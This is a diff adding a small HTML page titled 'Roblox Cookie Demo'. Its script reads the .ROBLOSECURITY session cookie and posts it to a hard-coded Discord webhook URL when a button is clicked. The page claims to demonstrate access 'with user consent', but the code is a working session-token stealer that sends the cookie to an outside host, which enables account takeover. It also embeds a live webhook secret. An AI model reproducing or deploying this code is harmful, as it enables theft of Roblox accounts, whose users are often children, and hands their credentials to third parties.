@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Cookie Demo</title>
+</head>
+<body>
+    <h1>Roblox Cookie Demo</h1>
+    <p>Click the button below to demonstrate accessing the Roblox cookie (with user consent).</p>
+    <button id="getCookieButton">Get Roblox Cookie</button>
+
+    <script>
+// Function to get Roblox cookie
+function getRobloxCookie() {
+    let robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
+    return robloxCookie ? robloxCookie[1] : null;
+}
+
+// Function to send message to Discord webhook
+function sendToDiscord(message) {
+    const webhookUrl = "https://discord.com/api/webhooks/1260343086639222814/Br2bcXDieULyP2BeOr7MfyvrMt6Xlfbz9dwAywSWr5AAvNauZcq9vIb56NpzbfU0ubps";
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ content: message })
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Discord');
+        }
+        console.log('Message sent to Discord successfully');
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
+// Event listener for a button click to demonstrate consent
+document.getElementById('getCookieButton').addEventListener('click', function() {
+    let robloxCookie = getRobloxCookie();
+    if (robloxCookie) {
+        // Construct message with cookie value
+        let message = `Roblox cookie found: ${robloxCookie}`;
+        // Send message to Discord webhook
+        sendToDiscord(message);
+        alert('Roblox cookie found and sent to Discord webhook.');
+    } else {
+        alert('Roblox cookie not found.');
+    }
+});
+    </script>
+</body>
+</html>
